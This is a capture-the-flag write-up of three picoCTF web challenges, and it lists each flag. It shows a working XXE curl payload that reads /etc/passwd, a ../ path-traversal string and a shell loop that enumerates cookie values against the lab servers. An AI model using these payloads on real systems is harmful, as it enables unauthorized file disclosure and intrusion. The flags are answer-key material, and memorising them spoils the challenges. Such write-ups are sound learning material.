# SOAP

**Flag:** `picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}`

curl goes brrr this time.

### Devtools

clicking the view shows xml requests being sent. I remeber something about xml based attacks and a quickt google search turns up XXE

The hardest thing here is whether or not to use burpsuite or curl.

Quickly impliment it in curl (copy to curl in devtools is sooo goood) -
```sh
curl 'http://saturn.picoctf.net:59513/data' \
  -H 'Accept: */*' \
  -H 'Content-Type: application/xml' \
  --data-raw '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><ID>&xxe;</ID></data>' \
  --insecure
```
aaand that's it. Really. nothing more. almost disappointing.

- Sources:
https://portswigger.net/web-security/xxe

# Forbidden Paths

**Flag:** `picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}`

the description says that absolute paths dont work, so do a relative path of `../../../flag.txt`.
Sub 1 min for this lol.

# Cookies

**Flag:** `picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}`

Figure out that the cookie value changes whenever you put in a valid string (as initally given on the search as a suggestion), copy as curl from network tab
and then ask chatgpt for a bitta help with shell scripting as my typing speed sucks and me be lazy, leading us with -

```zsh
for i in {1..29}; do
  response=$(curl 'http://mercury.picoctf.net:54219/check' \
    -H 'Accept-Language: en-US,en;q=0.9' \
    -H 'Cache-Control: max-age=0' \
    -H 'Connection: keep-alive' \
    -H "Cookie: name=$i" \
    -H 'Upgrade-Insecure-Requests: 1' \
    --insecure)

  if [[ $response == *"picoCTF{"* ]]; then
    echo "Flag found: $response"
    break
  fi
done
```

which works perfectly.
